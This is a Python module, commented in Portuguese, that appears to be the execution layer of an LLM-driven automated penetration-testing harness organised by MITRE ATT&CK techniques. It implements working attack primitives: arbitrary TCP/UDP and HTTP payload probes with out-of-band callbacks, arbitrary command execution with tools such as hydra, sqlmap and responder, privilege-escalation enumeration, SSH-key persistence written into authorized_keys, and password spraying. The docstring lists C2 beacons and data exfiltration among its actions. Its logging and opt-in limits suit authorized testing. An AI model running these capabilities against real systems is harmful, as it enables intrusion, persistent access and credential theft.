"""Arsenal de sub-tecnicas MITRE VERIFICAVEIS por acao tatica.

O modelo .pt decide as 10 acoes taticas da kill chain (fixas pelo treino);
este modulo e a camada de EXECUCAO profissional de cada acao — cada
sub-tecnica mapeia um TID proprio, grava evidencia com sha256 e so declara
sucesso com canario executavel (mesma invariante do resto do harness).

Mapa acao tatica -> sub-tecnicas disponiveis (o orquestrador LLM escolhe
pelo fingerprint/hints; tudo auditado nos events e no attack path):

  DISCOVER_REMOTE    T1018 ping sweep | T1046 service scan
  DISCOVER_SERVICES  T1595.002 nmap NSE vuln | T1580 web discover
  EXPLOIT_REMOTE     T1078 credencial do inventario | T1110.001 cred attack
                     declarativo (opt-in) | T1210 exploit de servico
  PRIVILEGE_ESCALATE T1548/T1068 enum de escalada (privesc_scan) + check_root
  PERSIST_BACKDOOR   T1053.003 cron | T1098.004 chave SSH autorizada
  C2_ESTABLISH       T1071 beacon com token
  EXFILTRATE         T1041 crown jewel com sha256
"""
from __future__ import annotations

import json
import re
import secrets
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path

# TID de EXECUCAO por tool (usado nos events/attack path/report)
SUBTECH_BY_TOOL: dict[str, str] = {
    "get_state": "—",
    "get_vuln_hints": "T1592",
    "ping_sweep": "T1018",
    "service_scan": "T1046",
    "vuln_scan": "T1595.002",
    "web_discover": "T1580",
    "http_probe": "T1190",
    "net_probe": "T1095",
    "run_command": "T1059",
    "exploit_search": "T1595.002",
    "cve_lookup": "T1592",
    "ssh_login": "T1078",
    "cred_attack": "T1110.001",
    "remote_exec": "T1059",
    "check_root": "T1068",
    "privesc_scan": "T1548",
    "read_file": "T1005",
    "persist_backdoor": "T1053.003",
    "persist_ssh_key": "T1098.004",
    "c2_callback": "T1071",
    "exfiltrate": "T1041",
}

# Arsenal exposto ao orquestrador LLM (entra no get_state e no system prompt)
ARSENAL_BY_ACTION: dict[str, list[dict]] = {
    "DISCOVER_REMOTE": [
        {"tool": "ping_sweep", "tid": "T1018", "desc": "varredura de hosts vivos"},
    ],
    "DISCOVER_SERVICES": [
        {"tool": "service_scan", "tid": "T1046", "desc": "enumeracao nmap -sV"},
        {"tool": "vuln_scan", "tid": "T1595.002", "desc": "nmap NSE vuln nas portas ja conhecidas"},
        {"tool": "web_discover", "tid": "T1580", "desc": "recon web com deteccao de ANOMALIAS (catch-all, reflexao, stack trace)"},
        {"tool": "net_probe", "tid": "T1095", "desc": "TCP/UDP RAW com bytes arbitrarios — QUALQUER protocolo (FTP/DNS/Redis/SMB/RTSP/SCADA/sem-nome)"},
        {"tool": "exploit_search", "tid": "T1595.002", "desc": "exploits REAIS para o fingerprint: feed CVE LOCAL + searchsploit (Exploit-DB) + GitHub (online) — consulte ANTES de hipoteses"},
        {"tool": "cve_lookup", "tid": "T1592", "desc": "detalhe da CVE no espelho local do feed (versoes afetadas, referencias)"},
        {"tool": "run_command", "tid": "T1059", "desc": "comando ARBITRARIO do arsenal (nmap/ffuf/redis-cli/smbclient/snmpwalk/searchsploit...) — componha a tecnica"},
    ],
    "EXPLOIT_REMOTE": [
        {"tool": "ssh_login", "tid": "T1078", "desc": "credenciais do inventario (canario)"},
        {"tool": "cred_attack", "tid": "T1110.001", "desc": "senha testa combinacoes DECLARADAS no inventario (bounded, opt-in)"},
        {"tool": "http_probe", "tid": "T1190", "desc": "requisicao HTTP ARBITRARIA + canario out-of-band (oob_wait)"},
        {"tool": "net_probe", "tid": "T1095", "desc": "payload arbitrario TCP/UDP com canario OOB — explore o protocolo que quiser"},
        {"tool": "exploit_search", "tid": "T1595.002", "desc": "PoC/exploit publico p/ produto+versao do alvo (searchsploit --cve / termo)"},
        {"tool": "run_command", "tid": "T1059", "desc": "exploit pela ferramenta de linha de comando que voce compor"},
    ],
    "PRIVILEGE_ESCALATE": [
        {"tool": "privesc_scan", "tid": "T1548", "desc": "enum: sudo -l, SUID, capabilities, cron gravavel, kernel"},
        {"tool": "check_root", "tid": "T1068", "desc": "verificacao id -u == 0 (canario)"},
    ],
    "PERSIST_BACKDOOR": [
        {"tool": "persist_backdoor", "tid": "T1053.003", "desc": "cron com token (dispara sozinho)"},
        {"tool": "persist_ssh_key", "tid": "T1098.004", "desc": "chave SSH autorizada com marker (verificada por reconexao)"},
    ],
    "C2_ESTABLISH": [
        {"tool": "c2_callback", "tid": "T1071", "desc": "beacon /dev/tcp com token ao listener"},
    ],
    "EXFILTRATE": [
        {"tool": "exfiltrate", "tid": "T1041", "desc": "crown jewel via canal (sha256)"},
    ],
}

_WEB_PATHS = ("/", "/robots.txt", "/docs", "/api", "/api/docs", "/openapi.json",
              "/actuator", "/health", "/server-status", "/.env", "/api/v1",
              "/swagger", "/graphiql", "/admin")

# paths aleatorios para detectar catch-all (servico que responde 200 a TUDO)
_CATCHALL_PROBE = "/zz-nada-aqui-9f3a-pentest"

# Binarios permitidos no run_command (allowlist ampla de pentest; tudo
# auditado com evidencia, denylist e budgets). Primeiro token do comando.
ALLOWED_BINARIES: frozenset[str] = frozenset({
    "nmap", "nc", "ncat", "netcat", "socat", "curl", "wget", "ping", "traceroute",
    "ssh", "sshpass", "scp", "sftp", "hydra", "medusa", "dig", "nslookup",
    "host", "whois", "smbclient", "rpcclient", "enum4linux", "snmpwalk",
    "onesixtyone", "redis-cli", "mysql", "psql", "ftp", "tnftp", "tftp",
    "telnet", "amass", "subfinder", "ffuf", "gobuster", "dirb", "nikto",
    "nuclei", "sqlmap", "wafw00f", "whatweb", "masscan", "udp-proto-scanner",
    "crackmapexec", "nbtscan", "arp-scan", "responder", "singularity",
    "openssl", "base64", "xxd", "hexdump", "strings", "file",
    "searchsploit",
})


def net_probe(tb, host_ip: str, port: int, proto: str = "tcp",
              send_hex: str | None = None, send_text: str | None = None,
              read_timeout: float = 5.0, oob_wait: int = 0) -> dict:
    """T1095/T1046: interacao RAW com QUALQUER protocolo TCP/UDP.

    Primitiva universal de caça: conecta e envia bytes arbitrarios (hex ou
    texto), le a resposta bruta com timeout — cobre FTP, SMTP, DNS, Redis,
    SMB, RTSP, VNC, telnet, protocolos industriais/SCADA e qualquer coisa
    que exista ou ainda nao tenha nome. Com oob_wait>0 injeta canario
    out-of-band na carga e espera callback no listener C2.
    """
    import socket as _socket
    tb._ip(host_ip)
    if proto not in ("tcp", "udp"):
        return {"ok": False, "error": f"proto invalido: {proto} (tcp|udp)"}
    if send_hex and send_text:
        return {"ok": False, "error": "use send_hex OU send_text, nao ambos"}
    payload = bytes.fromhex(send_hex) if send_hex else (
        send_text.encode("utf-8") if send_text else b"")
    token = None
    if oob_wait > 0:
        src = tb._local_source_ip(host_ip)
        if src:
            token = "PENTEST_CANARY_" + secrets.token_hex(8)
            payload = payload + (
                f"\r\nOOB http://{src}:{tb.inv.listener_port}/{token}\r\n").encode()
    resumo_tx = (send_hex or (send_text or "")[:120])[:160]
    tb._log_probe(f"net {proto} {host_ip}:{port} tx={resumo_tx!r}"
                  + (f" [oob {oob_wait}s]" if oob_wait else ""))
    if tb.dry_run:
        return {"ok": True, "dry_run": True, "proto": proto, "port": port}
    saida: dict = {"proto": proto, "port": int(port), "tx_bytes": len(payload)}
    try:
        s = _socket.socket(
            _socket.AF_INET,
            _socket.SOCK_STREAM if proto == "tcp" else _socket.SOCK_DGRAM)
        s.settimeout(read_timeout)
        if proto == "tcp":
            s.connect((host_ip, int(port)))
            if payload:
                s.sendall(payload)
        else:
            s.sendto(payload, (host_ip, int(port)))
        chunks: list[bytes] = []
        try:
            while sum(len(c) for c in chunks) < 65536:
                data = s.recv(4096)
                if not data:
                    break
                chunks.append(data)
                if sum(len(c) for c in chunks) > 8192:
                    break
        except (_socket.timeout, OSError):
            pass
        s.close()
        raw = b"".join(chunks)
        saida.update({
            "ok": True, "rx_bytes": len(raw),
            "rx_hex": raw[:2048].hex(),
            "rx_text": raw[:2048].decode("utf-8", "replace"),
        })
    except OSError as e:
        saida.update({"ok": False, "error": f"{type(e).__name__}: {e}"})
    ev = tb._save_evidence(
        "net_probe",
        f"{proto}_{port}_{abs(hash(resumo_tx)) % 10**8}_"
        f"{len(tb.probe_log):04d}.json",
        json.dumps(saida, ensure_ascii=False, indent=1))
    saida["evidence"] = ev["file"]
    saida["tid"] = "T1095"
    if token and oob_wait > 0:
        listener = tb.channels.ensure_listener()
        res_oob = listener.wait_for_token(token, wait_seconds=oob_wait)
        # nome unico: cada sonda OOB gera o SEU log (nome fixo seria
        # sobrescrito e o manifesto ficaria com sha256 divergente)
        ev2 = tb._save_evidence("net_probe",
                                f"oob_listener_{len(tb.probe_log):04d}.log",
                                res_oob["log"])
        saida["oob_callback"] = res_oob["verified"]
        saida["oob_evidence"] = ev2["file"]
        if res_oob["verified"]:
            tb.step_canaries.append({
                "kind": "oob_net", "token": token,
                "evidence": ev2["file"], "sha256": ev2["sha256"],
                "verified": True})
    return saida


def run_command(tb, command: str, timeout: int = 120) -> dict:
    """T1059: comando ARBITRARIO do arsenal de pentest (allowlist de
    binarios + denylist + budget + evidencia integral com sha256).

    E o caminho para TTPs que ainda nao existem como tool: o orquestrador
    COMPÕE a tecnica com as ferramentas de linha de comando que ja existem
    (nmap NSE custom, ffuf com wordlist propria, redis-cli, smbclient...).
    """
    import shlex
    tb.safety.check_wall_clock()
    if not command.strip():
        return {"ok": False, "error": "comando vazio"}
    try:
        partes = shlex.split(command)
    except ValueError as e:
        return {"ok": False, "error": f"parse do comando: {e}"}
    if not partes:
        return {"ok": False, "error": "comando vazio"}
    binario = Path(partes[0]).name
    if binario not in ALLOWED_BINARIES:
        return {"ok": False, "error":
                f"binario '{binario}' fora da allowlist ({len(ALLOWED_BINARIES)} "
                f"ferramentas); primitivas: net_probe/http_probe cobrem "
                f"qualquer protocolo"}
    tb._log_cmd(command)
    if tb.dry_run:
        return {"ok": True, "dry_run": True, "command": command}
    try:
        proc = subprocess.run(partes, capture_output=True, text=True,
                              timeout=timeout)
        out = (proc.stdout or "") + (proc.stderr or "")
        res = {"ok": proc.returncode == 0, "rc": proc.returncode,
               "stdout": (proc.stdout or "")[:6000],
               "stderr": (proc.stderr or "")[:2000]}
    except subprocess.TimeoutExpired:
        res = {"ok": False, "error": f"timeout {timeout}s"}
        out = "(timeout)"
    except FileNotFoundError as e:
        res = {"ok": False, "error": f"binario ausente no container: {e}"}
        out = str(e)
    ev = tb._save_evidence(
        "run_command",
        f"{binario}_{abs(hash(command)) % 10**8}.txt",
        f"$ {command}\n\n{out[:200000]}")
    res["evidence"] = ev["file"]
    res["tid"] = "T1059"
    return res


def _web_anomalias(found: list[dict]) -> list[str]:
    """Sinais de comportamento anômalo que sugerem onde cavar um 0-day."""
    anom: list[str] = []
    ok = {f["path"]: f for f in found if f.get("status") == 200}
    if _CATCHALL_PROBE in ok and ok[_CATCHALL_PROBE].get("bytes", 0) > 0:
        anom.append(f"catch-all: porta responde 200 com corpo ate em "
                    f"{_CATCHALL_PROBE} — rota falsa tratada como valida "
                    f"(routing/wildcard suspeito: testar injecao de path)")
    for f in found:
        corpo = f.get("trecho", "") or ""
        if "{{" in corpo or "{%" in corpo or "${" in corpo:
            anom.append(f"reflexao de template em {f['path']} — testar SSTI")
        if "traceback" in corpo.lower() or "exception" in corpo.lower():
            anom.append(f"erro verboso/stack trace em {f['path']} — info leak")
    return anom


def http_probe(tb, host_ip: str, port: int, method: str = "GET",
               path: str = "/", headers: dict | None = None,
               body: str | None = None, timeout: int = 10,
               oob_wait: int = 0) -> dict:
    """T1190 (probe): requisicao HTTP ARBITRARIA com resposta completa.

    E a mao de verdade do orquestrador para caça a 0-day: metodo, path,
    headers e body livres; resposta completa (status, headers, corpo,
    timing). Com oob_wait>0, injeta um canario out-of-band (callback ao
    listener C2 com token unico) e espera — detecta SSRF/blind RCE/link
    que o servidor busca sozinho.
    """
    tb._ip(host_ip)
    if method.upper() not in {"GET", "POST", "PUT", "HEAD", "OPTIONS", "DELETE",
                              "PATCH", "TRACE"}:
        return {"ok": False, "error": f"metodo nao permitido: {method}"}
    token = None
    hdrs = {k: str(v) for k, v in (headers or {}).items()}
    hdrs.setdefault("User-Agent", "pentest-harness/1.0 (autorizado)")
    if oob_wait and oob_wait > 0:
        src = tb._local_source_ip(host_ip)
        if src:
            token = "PENTEST_CANARY_" + secrets.token_hex(8)
            hdrs["X-Pentest-Canary"] = token
            # referencia oob: varios sinks (ssrf, fetch de link, markdown
            # preview, webhooks) buscam URLs do corpo/header
            if body:
                body = body + f"\nhttp://{src}:{tb.inv.listener_port}/{token}"
            else:
                hdrs["Referer"] = f"http://{src}:{tb.inv.listener_port}/{token}"
    url = f"http://{host_ip}:{int(port)}{path}"
    tb._log_probe(f"{method.upper()} {url}"
                  + (f" [oob {oob_wait}s]" if oob_wait else ""))
    data = body.encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, headers=hdrs,
                                 method=method.upper())
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            corpo = resp.read(30000).decode("utf-8", "replace")
            saida = {"ok": True, "status": resp.status,
                     "headers": dict(resp.headers.items()),
                     "corpo": corpo[:4000], "bytes": len(corpo),
                     "timing_ms": int((time.monotonic() - t0) * 1000)}
    except urllib.error.HTTPError as e:
        corpo = e.read(30000).decode("utf-8", "replace") if e.fp else ""
        saida = {"ok": True, "status": e.code,
                 "headers": dict(e.headers.items()),
                 "corpo": corpo[:4000], "bytes": len(corpo),
                 "timing_ms": int((time.monotonic() - t0) * 1000)}
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        saida = {"ok": False, "error": f"{type(e).__name__}: {e}"}
    # sufixo do probe_log no nome: probes repetidos (mesmo path/payload)
    # NAO podem colidir — o manifesto guarda 1 sha256 por arquivo
    ev = tb._save_evidence(
        "http_probe",
        f"{method.upper()}_{abs(hash(path)) % 10**8}_"
        f"{len(tb.probe_log):04d}.json",
        json.dumps({"url": url, "headers_enviados": hdrs,
                    "body": (body or "")[:2000], "resposta": saida},
                   ensure_ascii=False, indent=1))
    saida["evidence"] = ev["file"]
    saida["tid"] = "T1190"
    if token and oob_wait > 0:
        listener = tb.channels.ensure_listener()
        res_oob = listener.wait_for_token(token, wait_seconds=oob_wait)
        # nome unico: cada sonda OOB gera o SEU log (idem net_probe)
        ev2 = tb._save_evidence("http_probe",
                                f"oob_listener_{len(tb.probe_log):04d}.log",
                                res_oob["log"])
        saida["oob_callback"] = res_oob["verified"]
        saida["oob_evidence"] = ev2["file"]
        if res_oob["verified"]:
            tb.step_canaries.append({
                "kind": "oob_web", "token": token,
                "evidence": ev2["file"], "sha256": ev2["sha256"],
                "verified": True})
    return saida


def extract_title(html: str) -> str:
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
    return re.sub(r"\s+", " ", m.group(1)).strip()[:120] if m else ""


def web_discover(tb, host_ip: str, port: int, timeout: int = 8) -> dict:
    """T1580: recon web — paths comuns + PROBE CATCH-ALL + anomalias.

    Leitura apenas; cada resposta vira evidencia. As ANOMALIAS (catch-all,
    reflexao de template, stack traces) sao a pista de onde um 0-day pode
    morar — o orquestrador as usa para formular hipoteses com http_probe.
    """
    tb._ip(host_ip)
    found: list[dict] = []
    base = f"http://{host_ip}:{int(port)}"
    for path in (_WEB_PATHS + (_CATCHALL_PROBE,)):
        url = base + path
        tb.safety.check_wall_clock()
        req = urllib.request.Request(
            url, headers={"User-Agent": "pentest-harness/1.0 (autorizado)"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(20000).decode("utf-8", "replace")
                found.append({
                    "path": path, "status": resp.status,
                    "server": resp.headers.get("Server", ""),
                    "title": extract_title(body),
                    "bytes": len(body),
                    "trecho": body[:300].replace("\n", " "),
                })
        except urllib.error.HTTPError as e:
            found.append({"path": path, "status": e.code, "bytes": 0})
        except (urllib.error.URLError, TimeoutError, OSError):
            continue
    interesting = [f for f in found
                   if f.get("status") == 200 and f.get("bytes", 0) > 0]
    anomalias = _web_anomalias(found)
    ev = tb._save_evidence("web_discover", f"port{port}.json",
                           json.dumps(found, ensure_ascii=False, indent=1))
    return {"ok": bool(interesting), "port": port,
            "endpoints_200": [f["path"] for f in interesting],
            "anomalias": anomalias,
            "detalhes": found, "evidence": ev["file"], "tid": "T1580"}


def vuln_scan(tb, host_ip: str, timeout: int = 240) -> dict:
    """T1595.002: nmap NSE (vuln/vulners) NAS PORTAS JA CONHECIDAS do host."""
    tb._ip(host_ip)
    rec = tb.state.hosts[tb.state.ip_to_id[host_ip]]
    portas = ",".join(str(p) for p in sorted(rec.services)[:12]) or "80,22"
    cmd = ["nmap", "-Pn", "-sV", "--script", "vuln,vulners",
           "--script-timeout", "90s", "-p", portas, "-oX", "-", host_ip]
    tb._log_cmd(["nmap --script vuln,vulners -p", portas, host_ip])
    if tb.dry_run:
        return {"ok": True, "dry_run": True, "ports": portas}
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout)
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "nmap vuln timeout"}
    out = proc.stdout or ""
    achados = [ln.strip() for ln in out.splitlines()
               if "VULNERABLE" in ln.upper() or "CVE-" in ln][:40]
    ev = tb._save_evidence("vuln_scan", f"nse_{host_ip.replace('.', '_')}.txt", out[:200000])
    return {"ok": proc.returncode == 0, "ports": portas,
            "achados": achados, "evidence": ev["file"], "tid": "T1595.002"}


_PRIVESC_CMDS = [
    ("sudo", "sudo -n -l 2>&1 | head -15"),
    ("suid", "find / -perm -4000 -type f 2>/dev/null | head -20"),
    ("capabilities", "getcap -r / 2>/dev/null | head -10"),
    ("kernel", "uname -r; head -2 /etc/os-release"),
    ("cron", "ls -la /etc/cron.d /etc/cron.daily 2>/dev/null | head -15; crontab -l 2>&1"),
    ("gravavel", "find /etc /opt /srv -writable -type f 2>/dev/null | head -10"),
    ("sessao", "id; hostname"),
]


def privesc_scan(tb, host_ip: str) -> dict:
    """T1548/T1068: enum de superficie de escalada pelo canal verificado.

    Nao muda status — o avanco continua sendo exclusivamente do check_root
    (canario id -u == 0). Retorna relatorio para o orquestrador decidir.
    """
    tb._ip(host_ip)
    ch = tb._active_channel_for(host_ip)
    if ch is None:
        return {"ok": False, "error": "sem canal SSH verificado", "tid": "T1548"}
    achados: dict[str, str] = {}
    for nome, cmd in _PRIVESC_CMDS:
        tb.safety.check_wall_clock()
        tb._log_cmd(cmd)
        rc, out = ch.run(cmd, timeout=30)
        achados[nome] = out.strip()[:1500]
        if len(tb.command_log) >= 8:  # budget do passo
            break
    sugestoes: list[str] = []
    if "NOPASSWD" in achados.get("sudo", ""):
        sugestoes.append("sudo NOPASSWD: ha comandos root sem senha (T1548.003)")
    if achados.get("suid", ""):
        sugestoes.append("SUID presentes: comparar com gtfobins (T1548.001)")
    if achados.get("capabilities", ""):
        sugestoes.append("capabilities: cap_setuid/cap_setgid sao escalada direta")
    ev = tb._save_evidence(
        "privesc_scan", f"enum_{host_ip.replace('.', '_')}.json",
        json.dumps(achados, ensure_ascii=False, indent=1))
    return {"ok": True, "achados": achados, "sugestoes": sugestoes,
            "evidence": ev["file"], "tid": "T1548"}


def persist_ssh_key(tb, host_ip: str) -> dict:
    """T1098.004: chave SSH autorizada com marker — persistencia VERIFICADA
    por reconexao com a chave (canario independente do canal atual)."""
    tb._ip(host_ip)
    ch = tb._active_channel_for(host_ip)
    if ch is None:
        return {"ok": False, "verified": False,
                "error": "sem canal SSH verificado", "tid": "T1098.004"}
    if tb.dry_run:
        return {"ok": True, "dry_run": True, "tid": "T1098.004"}
    marker = "PENTEST_CANARY_" + secrets.token_hex(8)
    keydir = tb.evidence_root / f"step{tb.state.step:03d}_persist_key"
    keydir.mkdir(parents=True, exist_ok=True)
    keypath = keydir / "id_ed25519"
    gen = ["ssh-keygen", "-t", "ed25519", "-N", "", "-C", marker,
           "-f", str(keypath), "-q"]
    try:
        subprocess.run(gen, check=True, capture_output=True, timeout=20)
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired,
            FileNotFoundError) as e:
        return {"ok": False, "verified": False,
                "error": f"ssh-keygen falhou: {e}", "tid": "T1098.004"}
    pub = (keypath.with_suffix(".pub")).read_text().strip()
    tb._log_cmd(f"authorized_keys += [marker {marker}] @ {host_ip} [T1098.004]")
    rc, out = ch.run(
        f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
        f"echo '{pub} # {marker}' >> ~/.ssh/authorized_keys && "
        f"chmod 600 ~/.ssh/authorized_keys && echo instalada", timeout=30)
    ev_i = tb._save_evidence("persist_ssh_key", "install.txt", out)
    # canario: reconectar COM A CHAVE NOVA e pedir token (nao reusa o canal)
    token = "PENTEST_CANARY_" + secrets.token_hex(8)
    from .inventory import SshCred
    cred = SshCred(username=ch.cred.username, key_path=str(keypath),
                   port=ch.cred.port)
    novo = tb.channels.ssh(host_ip, cred)
    rc2, out2 = novo.run(f"echo {token}", timeout=20)
    ev_c = tb._save_evidence("persist_ssh_key", "canary_recon.txt", out2)
    verified = token in out2
    if verified:
        rec = tb.state.hosts[tb.state.ip_to_id[host_ip]]
        if rec.status < 4:
            rec.status = 4  # BACKDOORED (persistencia verificada)
    tb.step_canaries.append({
        "kind": "ssh_key", "token": token, "evidence": ev_c["file"],
        "sha256": ev_c["sha256"], "verified": verified,
    })
    return {"ok": verified, "verified": verified, "marker": marker,
            "install_rc": rc, "canary_rc": rc2,
            "evidence": ev_c["file"], "tid": "T1098.004",
            "cleanup_hint": f"sed -i '/{marker}/d' ~/.ssh/authorized_keys"}


def cred_attack(tb, host_ip: str, service: str = "ssh") -> dict:
    """T1110.001: password spray DECLARADO no inventario (opt-in, bounded).

    So roda se bruteforce.enabled=true no YAML; combinacoes limitadas a
    users x passwords com teto max_attempts; cada tentativa com canario.
    """
    tb._ip(host_ip)
    bf = getattr(tb.inv, "bruteforce", None)
    if bf is None or not bf.enabled:
        return {"ok": False, "error":
                "cred_attack desabilitado (bruteforce.enabled=false no "
                "inventario); use ssh_login com as credenciais declaradas",
                "tid": "T1110.001"}
    if service not in bf.services:
        return {"ok": False, "error": f"servico {service} fora de bruteforce.services",
                "tid": "T1110.001"}
    tentativas: list[dict] = []
    n = 0
    for user in bf.users:
        for pw in bf.passwords:
            if n >= bf.max_attempts:
                break
            tb.safety.check_wall_clock()
            tb._log_cmd(f"cred_attack {service} {user}@{host_ip} [canario]")
            token = "PENTEST_CANARY_" + secrets.token_hex(8)
            from .inventory import SshCred
            cred = SshCred(username=user, password=pw)
            ch = tb.channels.ssh(host_ip, cred)
            rc, out = ch.run(f"echo {token}", timeout=tb.inv.ssh_connect_timeout + 10)
            ok = token in out
            tentativas.append({"user": user, "rc": rc, "verified": ok})
            n += 1
            if ok:
                ev = tb._save_evidence(
                    "cred_attack", "sucesso.txt",
                    f"cred verificada: {user} (canario ok)")
                rec = tb.state.hosts[tb.state.ip_to_id[host_ip]]
                rec.user_verified = True
                if rec.status < 2:
                    rec.status = 2
                tb.step_canaries.append({
                    "kind": "cred_attack", "token": token,
                    "evidence": ev["file"], "sha256": ev["sha256"],
                    "verified": True})
                return {"ok": True, "verified": True, "user": user,
                        "tentativas": tentativas, "n": n,
                        "evidence": ev["file"], "tid": "T1110.001"}
    ev = tb._save_evidence(
        "cred_attack", "tentativas.json",
        json.dumps(tentativas, ensure_ascii=False, indent=1))
    return {"ok": False, "verified": False, "tentativas": tentativas,
            "n": n, "evidence": ev["file"], "tid": "T1110.001"}
